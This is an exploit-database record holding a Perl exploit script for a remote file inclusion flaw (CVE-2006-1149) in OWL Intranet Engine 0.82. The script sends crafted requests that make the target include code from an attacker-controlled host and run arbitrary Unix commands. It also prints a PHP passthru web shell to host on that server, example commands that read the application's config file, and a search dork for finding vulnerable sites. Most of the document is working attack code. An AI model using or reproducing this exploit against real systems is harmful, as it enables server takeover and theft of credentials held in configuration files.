{
  "id": "1561",
  "title": "OWL Intranet Engine 0.82 - &#039;xrms_file_root&#039; Code Execution",
  "cve": "CVE-2006-1149",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\nprint \"WwwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWwoLWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWw**wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWo\u00b0*\u00f2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWwo\u00b0 *\u00f2wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWW\u00f2\u00b0  \u00b0\u00b0*\u00f2wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWwo\u00b0      \u00b0\u00b0*o\u00f2wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWw\u00f2*\u00b0        \u00b0*\u00f2wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWw\u00f2*\u00b0       \u00b0\u00f2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWwwwLLwwwWWwo\u00b0      oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWL*\u00b0              \u00b0*o\u00b0     \u00b0wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWW*     \u00b0*\u00f2wwwwww\u00f2*             WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWo     \u00b0Lwwwwwwwwwwww\u00f2           \u00b0WWWWWWwwwwwWWWWWWwwwwwwwwwwwwwWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWW\u00f2     *wwwwwwwwwwwwwwww\u00b0          wWWWW*     *WWWWw             oWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWW\u00b0    \u00b0wwwww\u00f2\u00b0   \u00b0*wwwwww          \u00b0WWWw       wWWW\u00b0      w      oWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWW     owwww*     \u00b0* owwww\u00b0          wWW*       \u00b0WWw      oW      oWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWW     \u00b0wwww       * \u00b0wwww           *Ww    o    wW*     *WW      oWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWo     owww\u00b0        owww\u00b0     o      w*   \u00b0W\u00b0   \u00b0w      wWW      oWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWW*     *wwwo\u00b0    \u00b0\u00f2www\u00b0     oWo     \u00b0    wWL    \u00b0     \u00f2WWW      *wwwwwwwww\\r\\n\";\r\nprint \"WWWWWWWWWWWWWL\u00b0     \u00b0\u00f2wwwwwwwwo\u00b0     *wWWW\u00b0        *WWW\u00b0        \u00b0WWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWwo\u00b0      \u00b0\u00b0\u00b0      \u00b0*LWWWWWWW        wWWWL       \u00b0WWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWwwwwLLLwwwwWWWWWWWWWWWWo      *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\u00b0     wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw    *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWo   wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\u00b0 *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\";\r\nprint \"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw\u00b0WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\\r\\n\\r\\n\";\r\nprint \"  OWL Intranet Engine  0.82 \\\"xrms_file_root\\\" cmmnds xctn xploit\\r\\n\";\r\nprint \"     -> works with register_globals = On & allow_url_fopen = On    \\r\\n\";\r\nprint \"              by rgod rgod<AT>autistici<DOT>org                    \\r\\n\";\r\nprint \"             site: http://retrogod.altervista.org              \\r\\n\\r\\n\";\r\nprint \"Sun-Tzu: \\\"But a kingdom that has once been destroyed can never come\\r\\n\";\r\nprint \"again into being; nor can the dead ever be brought back to life\\\"\\r\\n\\r\\n\";\r\nprint \"\\r\\n dork: intitle:\\\"owl intranet * owl\\\" 0.82\\r\\n\";\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$loc=urlEncode($ARGV[2]);\r\n$cmd=\"\"; for ($i=3; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nif (@ARGV < 4)\r\n{\r\nprint \"\\r\\nUsage:\\r\\n\";\r\nprint \"perl owl_082_xpl.pl SERVER PATH LOCATION COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where OWL is installed.\\r\\n\";\r\nprint \"PATH           - Path to OWL (ex: /owl/ or just /) \\r\\n\";\r\nprint \"LOCATION       - a site with the code to include (without ending slash)\\r\\n\";\r\nprint \"COMMAND        - a Unix command\\r\\n\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl owl_xpl.pl localhost /owl/ http://192.168.1.3 ls -la\\r\\n\";\r\nprint \"perl owl_xpl.pl localhost /owl/ http://192.168.1.3 cat ./../config/owl.php\\r\\n\\r\\n\";\r\nprint \"note: on http location you need this code in /include-locations.inc/index.html :\\r\\n\\r\\n\";\r\n\r\nprint \"<?php\\r\\n\";\r\nprint \"if (get_magic_quotes_gpc())\\r\\n\";\r\nprint \"{\\$_GET[\\\"cmd\\\"]=stripslashes(\\$_GET[\\\"cmd\\\"]);}\\r\\n\";\r\nprint \"ini_set(\\\"max_execution_time\\\",0);\\r\\n\";\r\nprint \"passthru(\\$_GET[\\\"cmd\\\"]);\\r\\n\";\r\nprint \"die;\\r\\n\";\r\nprint \"?>\\r\\n\";\r\nexit();\r\n}\r\n  $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", Timeout  => 10, PeerPort=>\"http(80)\")\r\n  or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n  print $sock \"GET \".$path.\"lib/OWL_API.php?cmd=\".$cmd.\"&xrms_file_root=\".$loc.\" HTTP/1.1\\r\\n\";\r\n  print $sock \"User-Agent: Y!TunnelPro\\r\\n\";\r\n  print $sock \"Host: \".$serv.\"\\r\\n\";\r\n  print $sock \"Connection: close\\r\\n\\r\\n\";\r\n\r\n  while ($answer = <$sock>) {\r\n    print $answer;\r\n  }\r\n  close($sock);\r\n\r\n# milw0rm.com [2006-03-07]",
  "url": "https://www.exploit-db.com/exploits/1561"
}